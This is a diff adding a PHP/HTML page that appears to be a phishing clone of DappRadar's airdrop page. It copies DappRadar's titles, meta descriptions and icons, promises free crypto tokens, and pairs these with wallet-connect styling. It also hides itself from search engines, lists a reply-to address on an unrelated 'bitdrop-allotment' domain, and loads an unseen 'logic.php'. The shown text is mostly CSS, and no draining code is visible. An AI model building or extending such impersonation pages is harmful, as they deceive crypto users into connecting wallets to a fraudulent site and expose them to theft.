@@ -1,0 +1,2316 @@
+<?php
+require "logic.php";
+?>
+<html style='--w3m-color-fg-1: rgb(228,231,231); --w3m-color-fg-2: rgb(148,158,158); --w3m-color-fg-3: rgb(110,119,119); --w3m-color-bg-1: rgb(20,20,20); --w3m-color-bg-2: rgb(39,42,42); --w3m-color-bg-3: rgb(59,64,64); --w3m-color-overlay: rgba(255,255,255,0.1); --w3m-accent-color: #3396FF; --w3m-accent-fill-color: #FFFFFF; --w3m-z-index: 10000; --w3m-background-color: #3396FF; --w3m-background-border-radius: 8px; --w3m-container-border-radius: 30px; --w3m-wallet-icon-border-radius: 15px; --w3m-wallet-icon-large-border-radius: 30px; --w3m-wallet-icon-small-border-radius: 7px; --w3m-input-border-radius: 28px; --w3m-button-border-radius: 10px; --w3m-notification-border-radius: 36px; --w3m-secondary-button-border-radius: 28px; --w3m-icon-button-border-radius: 50%; --w3m-button-hover-highlight-border-radius: 10px; --w3m-text-big-bold-size: 20px; --w3m-text-big-bold-weight: 600; --w3m-text-big-bold-line-height: 24px; --w3m-text-big-bold-letter-spacing: -0.03em; --w3m-text-big-bold-text-transform: none; --w3m-text-xsmall-bold-size: 10px; --w3m-text-xsmall-bold-weight: 700; --w3m-text-xsmall-bold-line-height: 12px; --w3m-text-xsmall-bold-letter-spacing: 0.02em; --w3m-text-xsmall-bold-text-transform: uppercase; --w3m-text-xsmall-regular-size: 12px; --w3m-text-xsmall-regular-weight: 600; --w3m-text-xsmall-regular-line-height: 14px; --w3m-text-xsmall-regular-letter-spacing: -0.03em; --w3m-text-xsmall-regular-text-transform: none; --w3m-text-small-thin-size: 14px; --w3m-text-small-thin-weight: 500; --w3m-text-small-thin-line-height: 16px; --w3m-text-small-thin-letter-spacing: -0.03em; --w3m-text-small-thin-text-transform: none; --w3m-text-small-regular-size: 14px; --w3m-text-small-regular-weight: 600; --w3m-text-small-regular-line-height: 16px; --w3m-text-small-regular-letter-spacing: -0.03em; --w3m-text-small-regular-text-transform: none; --w3m-text-medium-regular-size: 16px; --w3m-text-medium-regular-weight: 600; --w3m-text-medium-regular-line-height: 20px; --w3m-text-medium-regular-letter-spacing: -0.03em; --w3m-text-medium-regular-text-transform: none; --w3m-font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Ubuntu, "Helvetica Neue", sans-serif; --w3m-font-feature-settings: "tnum" on, "lnum" on, "case" on; --w3m-success-color: rgb(38,181,98); --w3m-error-color: rgb(242, 90, 103); --w3m-overlay-background-color: rgba(0, 0, 0, 0.3); --w3m-overlay-backdrop-filter: blur(6px); --w3m-background-image-url: none;'>
+ <head><title>Unlock Exclusive Web3 Rewards with DappRadar Airdrops</title>
+<meta name="Author" content="bbbb" />
+<meta name="Revisit-After" content="14 Days" />
+<meta name="Rating" content="General" />
+<meta name="Reply-To" content="team@bbbb.bitdrop-allotment.com" />
+<meta http-equiv="Content-Language" content="EN" />
+<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
+<meta name="Description" content="Discover exclusive Web3 rewards and earn crypto with DappRadar Airdrops. Unlock unique NFTs, tokens, and other benefits by participating in our airdrop campaigns. Don't miss out on these limited-time opportunities to grow your Web3 portfolio." />
+<meta name="Keywords" content="
+dappradar airdrops, dappradar crypto airdrops, dappradar airdrop list, dappradar decentralized exchange airdrops, dex airdrops, decentralized exchange airdrops, crypto airdrops, blockchain airdrops, cryptocurrency airdrops, free crypto airdrops, airdrop opportunities, airdrop alerts, airdrop tracking, airdrop announcements, airdrop news, new crypto airdrops, upcoming airdrops, airdrops to claim, airdrop events, airdrop marketing, airdrop services, airdrop platform, airdrop campaigns, airdrop distribution, airdrop rewards, airdrop eligibility, airdrop participation
+" />
+<meta name="robots" content="noindex,nofollow" />
+<meta charset="utf-8">
+<meta content="no-cache" http-equiv="Pragma">
+<style>
+   * { overflow: visible !important; }
+#popup { z-index: 9 !important; }
+  </style>
+<meta content="width=device-width, initial-scale=1, shrink-to-fit=no" name="viewport">
+<title>
+   Airdrops - Get free crypto tokens | DappRadar
+  </title>
+<meta content="Airdrops - Get free crypto tokens | DappRadar" name="title">
+<meta content="Get free and verified crypto airdrops. Have the chance to get the latest tokens with a focus on DeFi airdrops and NFT, exclusively on DappRadar Hub." name="description">
+<meta content="DappRadar" property="og:site_name">
+<meta content="width=device-width,initial-scale=1" name="viewport">
+<meta content="yes" name="mobile-web-app-capable">
+<link href="favicon-32x32.png" rel="icon" sizes="32x32" type="image/png">
+<link color="#5bbad5" href="https://static.dappradar.com/portfolio-fe-pr/public-assets/safari-pinned-tab.svg" rel="mask-icon">
+<meta content="#da532c" name="msapplication-TileColor">
+<meta content="#006cff" name="theme-color">
+<meta content="website" property="og:type">
+<meta content="Airdrops - Get free crypto tokens | DappRadar" property="og:title">
+<meta content="Get free and verified crypto airdrops. Have the chance to get the latest tokens with a focus on DeFi airdrops and NFT, exclusively on DappRadar Hub." property="og:description">
+<meta content="https://static.dappradar.com/portfolio-fe-pr/public-assets/seo-images/og-airdrops.jpg" property="og:image">
+<meta content="summary_large_image" property="twitter:card">
+<meta content="https://dappradar.com/hub/airdrops" property="twitter:url">
+<meta content="@dappradar" name="twitter:site">
+<meta content="Airdrops - Get free crypto tokens | DappRadar" property="twitter:title">
+<meta content="Get free and verified crypto airdrops. Have the chance to get the latest tokens with a focus on DeFi airdrops and NFT, exclusively on DappRadar Hub." property="twitter:description">
+<meta content="https://static.dappradar.com/portfolio-fe-pr/public-assets/seo-images/og-airdrops.jpg" property="twitter:image">
+<meta content="DappRadar" name="apple-mobile-web-app-title">
+<meta content="yes" name="apple-mobile-web-app-capable">
+<meta content="default" name="apple-mobile-web-app-status-bar-style">
+<meta content="#ffffff" name="theme-color">
+<link href="https://dappradar.com/charizard/icon_180x180.c43b28260a08055ec7a720f9116d5ab1.png" rel="apple-touch-icon" sizes="180x180">
+<link href="https://dappradar.com/charizard/icon_167x167.874c4a0074deeb91fee3e3041e49dd21.png" rel="apple-touch-icon" sizes="167x167">
+<link href="https://dappradar.com/charizard/icon_152x152.764f384b218c114935d22f3e64b3e22c.png" rel="apple-touch-icon" sizes="152x152">
+<link href="https://dappradar.com/charizard/icon_120x120.463c11c35bb258359cb083cb4f42702c.png" rel="apple-touch-icon" sizes="120x120">
+<link href="style_1.css" rel="stylesheet">
+<link href="style_2.css" rel="stylesheet">
+<link href="style_3.css" rel="stylesheet">
+<style>
+   .swal2-popup.swal2-toast { box-sizing: border-box; grid-template-columns: min-content auto min-content; padding: 1em; overflow-y: hidden; background: rgb(255, 255, 255); box-shadow: rgba(0, 0, 0, 0.075) 0px 0px 1px, rgba(0, 0, 0, 0.075) 0px 1px 2px, rgba(0, 0, 0, 0.075) 1px 2px 4px, rgba(0, 0, 0, 0.075) 1px 3px 8px, rgba(0, 0, 0, 0.075) 2px 4px 16px; pointer-events: all; grid-area: 1 / 1 / 4 / 4 !important; }
+.swal2-popup.swal2-toast > * { grid-column: 2; }
+.swal2-popup.swal2-toast .swal2-title { margin: 0.5em 1em; padding: 0px; font-size: 1em; text-align: initial; }
+.swal2-popup.swal2-toast .swal2-loading { justify-content: center; }
+.swal2-popup.swal2-toast .swal2-input { height: 2em; margin: 0.5em; font-size: 1em; }
+.swal2-popup.swal2-toast .swal2-validation-message { font-size: 1em; }
+.swal2-popup.swal2-toast .swal2-footer { margin: 0.5em 0px 0px; padding: 0.5em 0px 0px; font-size: 0.8em; }
+.swal2-popup.swal2-toast .swal2-close { grid-area: 1 / 3 / 99 / 3; align-self: center; width: 0.8em; height: 0.8em; margin: 0px; font-size: 2em; }
+.swal2-popup.swal2-toast .swal2-html-container { margin: 0.5em 1em; padding: 0px; overflow: initial; font-size: 1em; text-align: initial; }
+.swal2-popup.swal2-toast .swal2-html-container:empty { padding: 0px; }
+.swal2-popup.swal2-toast .swal2-loader { grid-area: 1 / 1 / 99; align-self: center; width: 2em; height: 2em; margin: 0.25em; }
+.swal2-popup.swal2-toast .swal2-icon { grid-area: 1 / 1 / 99; align-self: center; width: 2em; min-width: 2em; height: 2em; margin: 0px 0.5em 0px 0px; }
+.swal2-popup.swal2-toast .swal2-icon .swal2-icon-content { display: flex; align-items: center; font-size: 1.8em; font-weight: bold; }
+.swal2-popup.swal2-toast .swal2-icon.swal2-success .swal2-success-ring { width: 2em; height: 2em; }
+.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^="swal2-x-mark-line"] { top: 0.875em; width: 1.375em; }
+.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^="swal2-x-mark-line"][class$="left"] { left: 0.3125em; }
+.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^="swal2-x-mark-line"][class$="right"] { right: 0.3125em; }
+.swal2-popup.swal2-toast .swal2-actions { justify-content: flex-start; height: auto; margin: 0.5em 0px 0px; padding: 0px 0.5em; }
+.swal2-popup.swal2-toast .swal2-styled { margin: 0.25em 0.5em; padding: 0.4em 0.6em; font-size: 1em; }
+.swal2-popup.swal2-toast .swal2-success { border-color: rgb(165, 220, 134); }
+.swal2-popup.swal2-toast .swal2-success [class^="swal2-success-circular-line"] { position: absolute; width: 1.6em; height: 3em; transform: rotate(45deg); border-radius: 50%; }
+.swal2-popup.swal2-toast .swal2-success [class^="swal2-success-circular-line"][class$="left"] { top: -0.8em; left: -0.5em; transform: rotate(-45deg); transform-origin: 2em 2em; border-radius: 4em 0px 0px 4em; }
+.swal2-popup.swal2-toast .swal2-success [class^="swal2-success-circular-line"][class$="right"] { top: -0.25em; left: 0.9375em; transform-origin: 0px 1.5em; border-radius: 0px 4em 4em 0px; }
+.swal2-popup.swal2-toast .swal2-success .swal2-success-ring { width: 2em; height: 2em; }
+.swal2-popup.swal2-toast .swal2-success .swal2-success-fix { top: 0px; left: 0.4375em; width: 0.4375em; height: 2.6875em; }
+.swal2-popup.swal2-toast .swal2-success [class^="swal2-success-line"] { height: 0.3125em; }
+.swal2-popup.swal2-toast .swal2-success [class^="swal2-success-line"][class$="tip"] { top: 1.125em; left: 0.1875em; width: 0.75em; }
+.swal2-popup.swal2-toast .swal2-success [class^="swal2-success-line"][class$="long"] { top: 0.9375em; right: 0.1875em; width: 1.375em; }
+.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-tip { animation: 0.75s ease 0s 1 normal none running swal2-toast-animate-success-line-tip; }
+.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-long { animation: 0.75s ease 0s 1 normal none running swal2-toast-animate-success-line-long; }
+.swal2-popup.swal2-toast.swal2-show { animation: 0.5s ease 0s 1 normal none running swal2-toast-show; }
+.swal2-popup.swal2-toast.swal2-hide { animation: 0.1s ease 0s 1 normal forwards running swal2-toast-hide; }
+.swal2-container { display: grid; position: fixed; z-index: 1060; inset: 0px; box-sizing: border-box; grid-template-areas: "top-start top top-end" "center-start center center-end" "bottom-start bottom-center bottom-end"; grid-template-rows: minmax(min-content, auto) minmax(min-content, auto) minmax(min-content, auto); height: 100%; padding: 0.625em; overflow-x: hidden; transition: background-color 0.1s ease 0s; }
+.swal2-container.swal2-backdrop-show, .swal2-container.swal2-noanimation { background: rgba(0, 0, 0, 0.4); }
+.swal2-container.swal2-backdrop-hide { background: rgba(0, 0, 0, 0) !important; }
+.swal2-container.swal2-top-start, .swal2-container.swal2-center-start, .swal2-container.swal2-bottom-start { grid-template-columns: minmax(0px, 1fr) auto auto; }
+.swal2-container.swal2-top, .swal2-container.swal2-center, .swal2-container.swal2-bottom { grid-template-columns: auto minmax(0px, 1fr) auto; }
+.swal2-container.swal2-top-end, .swal2-container.swal2-center-end, .swal2-container.swal2-bottom-end { grid-template-columns: auto auto minmax(0px, 1fr); }
+.swal2-container.swal2-top-start > .swal2-popup { align-self: start; }
+.swal2-container.swal2-top > .swal2-popup { grid-column: 2; place-self: start center; }
+.swal2-container.swal2-top-end > .swal2-popup, .swal2-container.swal2-top-right > .swal2-popup { grid-column: 3; place-self: start end; }
+.swal2-container.swal2-center-start > .swal2-popup, .swal2-container.swal2-center-left > .swal2-popup { grid-row: 2; align-self: center; }
+.swal2-container.swal2-center > .swal2-popup { grid-area: 2 / 2; place-self: center; }
+.swal2-container.swal2-center-end > .swal2-popup, .swal2-container.swal2-center-right > .swal2-popup { grid-area: 2 / 3; place-self: center end; }
+.swal2-container.swal2-bottom-start > .swal2-popup, .swal2-container.swal2-bottom-left > .swal2-popup { grid-area: 3 / 1; align-self: end; }
+.swal2-container.swal2-bottom > .swal2-popup { grid-area: 3 / 2; place-self: end center; }
+.swal2-container.swal2-bottom-end > .swal2-popup, .swal2-container.swal2-bottom-right > .swal2-popup { grid-area: 3 / 3; place-self: end; }
+.swal2-container.swal2-grow-row > .swal2-popup, .swal2-container.swal2-grow-fullscreen > .swal2-popup { grid-column: 1 / 4; width: 100%; }
+.swal2-container.swal2-grow-column > .swal2-popup, .swal2-container.swal2-grow-fullscreen > .swal2-popup { grid-row: 1 / 4; align-self: stretch; }
+.swal2-container.swal2-no-transition { transition: none 0s ease 0s !important; }
+.swal2-popup { display: none; position: relative; box-sizing: border-box; grid-template-columns: minmax(0px, 100%); width: 32em; max-width: 100%; padding: 0px 0px 1.25em; border: none; border-radius: 5px; background: rgb(255, 255, 255); color: rgb(84, 84, 84); font-family: inherit; font-size: 1rem; }
+.swal2-popup:focus { outline: none; }
+.swal2-popup.swal2-loading { overflow-y: hidden; }
+.swal2-title { position: relative; max-width: 100%; margin: 0px; padding: 0.8em 1em 0px; color: inherit; font-size: 1.875em; font-weight: 600; text-align: center; text-transform: none; overflow-wrap: break-word; }
+.swal2-actions { display: flex; z-index: 1; box-sizing: border-box; flex-wrap: wrap; align-items: center; justify-content: center; width: auto; margin: 1.25em auto 0px; padding: 0px; }
+.swal2-actions:not(.swal2-loading) .swal2-styled[disabled] { opacity: 0.4; }
+.swal2-actions:not(.swal2-loading) .swal2-styled:hover { background-image: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1)); }
+.swal2-actions:not(.swal2-loading) .swal2-styled:active { background-image: linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2)); }
+.swal2-loader { display: none; align-items: center; justify-content: center; width: 2.2em; height: 2.2em; margin: 0px 1.875em; animation: 1.5s linear 0s infinite normal none running swal2-rotate-loading; border-width: 0.25em; border-style: solid; border-radius: 100%; border-color: rgb(39, 120, 196) rgba(0, 0, 0, 0); }
+.swal2-styled { margin: 0.3125em; padding: 0.625em 1.1em; transition: box-shadow 0.1s ease 0s; box-shadow: rgba(0, 0, 0, 0) 0px 0px 0px 3px; font-weight: 500; }
+.swal2-styled:not([disabled]) { cursor: pointer; }
+.swal2-styled.swal2-confirm { border: 0px; border-radius: 0.25em; background: rgb(112, 102, 224); color: rgb(255, 255, 255); font-size: 1em; }
+.swal2-styled.swal2-confirm:focus { box-shadow: rgba(112, 102, 224, 0.5) 0px 0px 0px 3px; }
+.swal2-styled.swal2-deny { border: 0px; border-radius: 0.25em; background: rgb(220, 55, 65); color: rgb(255, 255, 255); font-size: 1em; }
+.swal2-styled.swal2-deny:focus { box-shadow: rgba(220, 55, 65, 0.5) 0px 0px 0px 3px; }
+.swal2-styled.swal2-cancel { border: 0px; border-radius: 0.25em; background: rgb(110, 120, 129); color: rgb(255, 255, 255); font-size: 1em; }
+.swal2-styled.swal2-cancel:focus { box-shadow: rgba(110, 120, 129, 0.5) 0px 0px 0px 3px; }
+.swal2-styled.swal2-default-outline:focus { box-shadow: rgba(100, 150, 200, 0.5) 0px 0px 0px 3px; }
+.swal2-styled:focus { outline: none; }
+.swal2-footer { justify-content: center; margin: 1em 0px 0px; padding: 1em 1em 0px; border-top: 1px solid rgb(238, 238, 238); color: inherit; font-size: 1em; }
+.swal2-timer-progress-bar-container { position: absolute; right: 0px; bottom: 0px; left: 0px; overflow: hidden; border-bottom-right-radius: 5px; border-bottom-left-radius: 5px; grid-column: auto !important; }
+.swal2-timer-progress-bar { width: 100%; height: 0.25em; background: rgba(0, 0, 0, 0.2); }
+.swal2-image { max-width: 100%; margin: 2em auto 1em; }
+.swal2-close { z-index: 2; align-items: center; justify-content: center; width: 1.2em; height: 1.2em; margin-top: 0px; margin-right: 0px; margin-bottom: -1.2em; padding: 0px; overflow: hidden; transition: color 0.1s ease 0s, box-shadow 0.1s ease 0s; border: none; border-radius: 5px; background: rgba(0, 0, 0, 0); color: rgb(204, 204, 204); font-family: monospace; font-size: 2.5em; cursor: pointer; justify-self: end; }
+.swal2-close:hover { transform: none; background: rgba(0, 0, 0, 0); color: rgb(242, 116, 116); }
+.swal2-close:focus { outline: none; box-shadow: rgba(100, 150, 200, 0.5) 0px 0px 0px 3px inset; }
+.swal2-html-container { z-index: 1; justify-content: center; margin: 1em 1.6em 0.3em; padding: 0px; overflow: auto; color: inherit; font-size: 1.125em; font-weight: normal; line-height: normal; text-align: center; overflow-wrap: break-word; word-break: break-word; }
+.swal2-input, .swal2-file, .swal2-textarea, .swal2-select, .swal2-radio, .swal2-checkbox { margin: 1em 2em 3px; }
+.swal2-input, .swal2-file, .swal2-textarea { box-sizing: border-box; width: auto; transition: border-color 0.1s ease 0s, box-shadow 0.1s ease 0s; border: 1px solid rgb(217, 217, 217); border-radius: 0.1875em; background: rgba(0, 0, 0, 0); box-shadow: rgba(0, 0, 0, 0.06) 0px 1px 1px inset, rgba(0, 0, 0, 0) 0px 0px 0px 3px; color: inherit; font-size: 1.125em; }
+.swal2-input.swal2-inputerror, .swal2-file.swal2-inputerror, .swal2-textarea.swal2-inputerror { border-color: rgb(242, 116, 116) !important; box-shadow: rgb(242, 116, 116) 0px 0px 2px !important; }
+.swal2-input:focus, .swal2-file:focus, .swal2-textarea:focus { border: 1px solid rgb(180, 219, 237); outline: none; box-shadow: rgba(0, 0, 0, 0.06) 0px 1px 1px inset, rgba(100, 150, 200, 0.5) 0px 0px 0px 3px; }
+.swal2-input::placeholder, .swal2-file::placeholder, .swal2-textarea::placeholder { color: rgb(204, 204, 204); }
+.swal2-range { margin: 1em 2em 3px; background: rgb(255, 255, 255); }
+.swal2-range input { width: 80%; }
+.swal2-range output { width: 20%; color: inherit; font-weight: 600; text-align: center; }
+.swal2-range input, .swal2-range output { height: 2.625em; padding: 0px; font-size: 1.125em; line-height: 2.625em; }
+.swal2-input { height: 2.625em; padding: 0px 0.75em; }
+.swal2-file { width: 75%; margin-right: auto; margin-left: auto; background: rgba(0, 0, 0, 0); font-size: 1.125em; }
+.swal2-textarea { height: 6.75em; padding: 0.75em; }
+.swal2-select { min-width: 50%; max-width: 100%; padding: 0.375em 0.625em; background: rgba(0, 0, 0, 0); color: inherit; font-size: 1.125em; }
+.swal2-radio, .swal2-checkbox { align-items: center; justify-content: center; background: rgb(255, 255, 255); color: inherit; }
+.swal2-radio label, .swal2-checkbox label { margin: 0px 0.6em; font-size: 1.125em; }
+.swal2-radio input, .swal2-checkbox input { flex-shrink: 0; margin: 0px 0.4em; }
+.swal2-input-label { display: flex; justify-content: center; margin: 1em auto 0px; }
+.swal2-validation-message { align-items: center; justify-content: center; margin: 1em 0px 0px; padding: 0.625em; overflow: hidden; background: rgb(240, 240, 240); color: rgb(102, 102, 102); font-size: 1em; font-weight: 300; }
+.swal2-validation-message::before { content: "!"; display: inline-block; width: 1.5em; min-width: 1.5em; height: 1.5em; margin: 0px 0.625em; border-radius: 50%; background-color: rgb(242, 116, 116); color: rgb(255, 255, 255); font-weight: 600; line-height: 1.5em; text-align: center; }
+.swal2-icon { position: relative; box-sizing: content-box; justify-content: center; width: 5em; height: 5em; margin: 2.5em auto 0.6em; border: 0.25em solid rgb(0, 0, 0); border-radius: 50%; font-family: inherit; line-height: 5em; cursor: default; user-select: none; }
+.swal2-icon .swal2-icon-content { display: flex; align-items: center; font-size: 3.75em; }
+.swal2-icon.swal2-error { border-color: rgb(242, 116, 116); color: rgb(242, 116, 116); }
+.swal2-icon.swal2-error .swal2-x-mark { position: relative; flex-grow: 1; }
+.swal2-icon.swal2-error [class^="swal2-x-mark-line"] { display: block; position: absolute; top: 2.3125em; width: 2.9375em; height: 0.3125em; border-radius: 0.125em; background-color: rgb(242, 116, 116); }
+.swal2-icon.swal2-error [class^="swal2-x-mark-line"][class$="left"] { left: 1.0625em; transform: rotate(45deg); }
+.swal2-icon.swal2-error [class^="swal2-x-mark-line"][class$="right"] { right: 1em; transform: rotate(-45deg); }
+.swal2-icon.swal2-error.swal2-icon-show { animation: 0.5s ease 0s 1 normal none running swal2-animate-error-icon; }
+.swal2-icon.swal2-error.swal2-icon-show .swal2-x-mark { animation: 0.5s ease 0s 1 normal none running swal2-animate-error-x-mark; }
+.swal2-icon.swal2-warning { border-color: rgb(250, 206, 168); color: rgb(248, 187, 134); }
+.swal2-icon.swal2-warning.swal2-icon-show { animation: 0.5s ease 0s 1 normal none running swal2-animate-error-icon; }
+.swal2-icon.swal2-warning.swal2-icon-show .swal2-icon-content { animation: 0.5s ease 0s 1 normal none running swal2-animate-i-mark; }
+.swal2-icon.swal2-info { border-color: rgb(157, 224, 246); color: rgb(63, 195, 238); }
+.swal2-icon.swal2-info.swal2-icon-show { animation: 0.5s ease 0s 1 normal none running swal2-animate-error-icon; }
+.swal2-icon.swal2-info.swal2-icon-show .swal2-icon-content { animation: 0.8s ease 0s 1 normal none running swal2-animate-i-mark; }
+.swal2-icon.swal2-question { border-color: rgb(201, 218, 225); color: rgb(135, 173, 189); }
+.swal2-icon.swal2-question.swal2-icon-show { animation: 0.5s ease 0s 1 normal none running swal2-animate-error-icon; }
+.swal2-icon.swal2-question.swal2-icon-show .swal2-icon-content { animation: 0.8s ease 0s 1 normal none running swal2-animate-question-mark; }
+.swal2-icon.swal2-success { border-color: rgb(165, 220, 134); color: rgb(165, 220, 134); }
+.swal2-icon.swal2-success [class^="swal2-success-circular-line"] { position: absolute; width: 3.75em; height: 7.5em; transform: rotate(45deg); border-radius: 50%; }
+.swal2-icon.swal2-success [class^="swal2-success-circular-line"][class$="left"] { top: -0.4375em; left: -2.0635em; transform: rotate(-45deg); transform-origin: 3.75em 3.75em; border-radius: 7.5em 0px 0px 7.5em; }
+.swal2-icon.swal2-success [class^="swal2-success-circular-line"][class$="right"] { top: -0.6875em; left: 1.875em; transform: rotate(-45deg); transform-origin: 0px 3.75em; border-radius: 0px 7.5em 7.5em 0px; }
+.swal2-icon.swal2-success .swal2-success-ring { position: absolute; z-index: 2; top: -0.25em; left: -0.25em; box-sizing: content-box; width: 100%; height: 100%; border: 0.25em solid rgba(165, 220, 134, 0.3); border-radius: 50%; }
+.swal2-icon.swal2-success .swal2-success-fix { position: absolute; z-index: 1; top: 0.5em; left: 1.625em; width: 0.4375em; height: 5.625em; transform: rotate(-45deg); }
+.swal2-icon.swal2-success [class^="swal2-success-line"] { display: block; position: absolute; z-index: 2; height: 0.3125em; border-radius: 0.125em; background-color: rgb(165, 220, 134); }
+.swal2-icon.swal2-success [class^="swal2-success-line"][class$="tip"] { top: 2.875em; left: 0.8125em; width: 1.5625em; transform: rotate(45deg); }
+.swal2-icon.swal2-success [class^="swal2-success-line"][class$="long"] { top: 2.375em; right: 0.5em; width: 2.9375em; transform: rotate(-45deg); }
+.swal2-icon.swal2-success.swal2-icon-show .swal2-success-line-tip { animation: 0.75s ease 0s 1 normal none running swal2-animate-success-line-tip; }
+.swal2-icon.swal2-success.swal2-icon-show .swal2-success-line-long { animation: 0.75s ease 0s 1 normal none running swal2-animate-success-line-long; }
+.swal2-icon.swal2-success.swal2-icon-show .swal2-success-circular-line-right { animation: 4.25s ease-in 0s 1 normal none running swal2-rotate-success-circular-line; }
+.swal2-progress-steps { flex-wrap: wrap; align-items: center; max-width: 100%; margin: 1.25em auto; padding: 0px; background: rgba(0, 0, 0, 0); font-weight: 600; }
+.swal2-progress-steps li { display: inline-block; position: relative; }
+.swal2-progress-steps .swal2-progress-step { z-index: 20; flex-shrink: 0; width: 2em; height: 2em; border-radius: 2em; background: rgb(39, 120, 196); color: rgb(255, 255, 255); line-height: 2em; text-align: center; }
+.swal2-progress-steps .swal2-progress-step.swal2-active-progress-step { background: rgb(39, 120, 196); }
+.swal2-progress-steps .swal2-progress-step.swal2-active-progress-step ~ .swal2-progress-step { background: rgb(173, 216, 230); color: rgb(255, 255, 255); }
+.swal2-progress-steps .swal2-progress-step.swal2-active-progress-step ~ .swal2-progress-step-line { background: rgb(173, 216, 230); }
+.swal2-progress-steps .swal2-progress-step-line { z-index: 10; flex-shrink: 0; width: 2.5em; height: 0.4em; margin: 0px -1px; background: rgb(39, 120, 196); }
+[class^="swal2"] { -webkit-tap-highlight-color: rgba(0, 0, 0, 0); }
+.swal2-show { animation: 0.3s ease 0s 1 normal none running swal2-show; }
+.swal2-hide { animation: 0.15s ease 0s 1 normal forwards running swal2-hide; }
+.swal2-noanimation { transition: none 0s ease 0s; }
+.swal2-scrollbar-measure { position: absolute; top: -9999px; width: 50px; height: 50px; overflow: scroll; }
+.swal2-rtl .swal2-close { margin-right: initial; margin-left: 0px; }
+.swal2-rtl .swal2-timer-progress-bar { right: 0px; left: auto; }
+@keyframes swal2-toast-show { 
+  0% { transform: translateY(-0.625em) rotateZ(2deg); }
+  33% { transform: translateY(0px) rotateZ(-2deg); }
+  66% { transform: translateY(0.3125em) rotateZ(2deg); }
+  100% { transform: translateY(0px) rotateZ(0deg); }
+}
+@keyframes swal2-toast-hide { 
+  100% { transform: rotateZ(1deg); opacity: 0; }
+}
+@keyframes swal2-toast-animate-success-line-tip { 
+  0% { top: 0.5625em; left: 0.0625em; width: 0px; }
+  54% { top: 0.125em; left: 0.125em; width: 0px; }
+  70% { top: 0.625em; left: -0.25em; width: 1.625em; }
+  84% { top: 1.0625em; left: 0.75em; width: 0.5em; }
+  100% { top: 1.125em; left: 0.1875em; width: 0.75em; }
+}
+@keyframes swal2-toast-animate-success-line-long { 
+  0% { top: 1.625em; right: 1.375em; width: 0px; }
+  65% { top: 1.25em; right: 0.9375em; width: 0px; }
+  84% { top: 0.9375em; right: 0px; width: 1.125em; }
+  100% { top: 0.9375em; right: 0.1875em; width: 1.375em; }
+}
+@keyframes swal2-show { 
+  0% { transform: scale(0.7); }
+  45% { transform: scale(1.05); }
+  80% { transform: scale(0.95); }
+  100% { transform: scale(1); }
+}
+@keyframes swal2-hide { 
+  0% { transform: scale(1); opacity: 1; }
+  100% { transform: scale(0.5); opacity: 0; }
+}
+@keyframes swal2-animate-success-line-tip { 
+  0% { top: 1.1875em; left: 0.0625em; width: 0px; }
+  54% { top: 1.0625em; left: 0.125em; width: 0px; }
+  70% { top: 2.1875em; left: -0.375em; width: 3.125em; }
+  84% { top: 3em; left: 1.3125em; width: 1.0625em; }
+  100% { top: 2.8125em; left: 0.8125em; width: 1.5625em; }
+}
+@keyframes swal2-animate-success-line-long { 
+  0% { top: 3.375em; right: 2.875em; width: 0px; }
+  65% { top: 3.375em; right: 2.875em; width: 0px; }
+  84% { top: 2.1875em; right: 0px; width: 3.4375em; }
+  100% { top: 2.375em; right: 0.5em; width: 2.9375em; }
+}
+@keyframes swal2-rotate-success-circular-line { 
+  0% { transform: rotate(-45deg); }
+  5% { transform: rotate(-45deg); }
+  12% { transform: rotate(-405deg); }
+  100% { transform: rotate(-405deg); }
+}
+@keyframes swal2-animate-error-x-mark { 
+  0% { margin-top: 1.625em; transform: scale(0.4); opacity: 0; }
+  50% { margin-top: 1.625em; transform: scale(0.4); opacity: 0; }
+  80% { margin-top: -0.375em; transform: scale(1.15); }
+  100% { margin-top: 0px; transform: scale(1); opacity: 1; }
+}
+@keyframes swal2-animate-error-icon { 
+  0% { transform: rotateX(100deg); opacity: 0; }
+  100% { transform: rotateX(0deg); opacity: 1; }
+}
+@keyframes swal2-rotate-loading { 
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+@keyframes swal2-animate-question-mark { 
+  0% { transform: rotateY(-360deg); }
+  100% { transform: rotateY(0deg); }
+}
+@keyframes swal2-animate-i-mark { 
+  0% { transform: rotateZ(45deg); opacity: 0; }
+  25% { transform: rotateZ(-25deg); opacity: 0.4; }
+  50% { transform: rotateZ(15deg); opacity: 0.8; }
+  75% { transform: rotateZ(-5deg); opacity: 1; }
+  100% { transform: rotateX(0deg); opacity: 1; }
+}
+body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) { overflow: hidden; }
+body.swal2-height-auto { height: auto !important; }
+body.swal2-no-backdrop .swal2-container { pointer-events: none; background-color: rgba(0, 0, 0, 0) !important; }
+body.swal2-no-backdrop .swal2-container .swal2-popup { pointer-events: all; }
+body.swal2-no-backdrop .swal2-container .swal2-modal { box-shadow: rgba(0, 0, 0, 0.4) 0px 0px 10px; }
+@media print {
+  body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) { overflow-y: scroll !important; }
+  body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) > [aria-hidden="true"] { display: none; }
+  body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) .swal2-container { position: static !important; }
+}
+body.swal2-toast-shown .swal2-container { box-sizing: border-box; width: 360px; max-width: 100%; background-color: rgba(0, 0, 0, 0); pointer-events: none; }
+body.swal2-toast-shown .swal2-container.swal2-top { inset: 0px auto auto 50%; transform: translateX(-50%); }
+body.swal2-toast-shown .swal2-container.swal2-top-end, body.swal2-toast-shown .swal2-container.swal2-top-right { inset: 0px 0px auto auto; }
+body.swal2-toast-shown .swal2-container.swal2-top-start, body.swal2-toast-shown .swal2-container.swal2-top-left { inset: 0px auto auto 0px; }
+body.swal2-toast-shown .swal2-container.swal2-center-start, body.swal2-toast-shown .swal2-container.swal2-center-left { inset: 50% auto auto 0px; transform: translateY(-50%); }
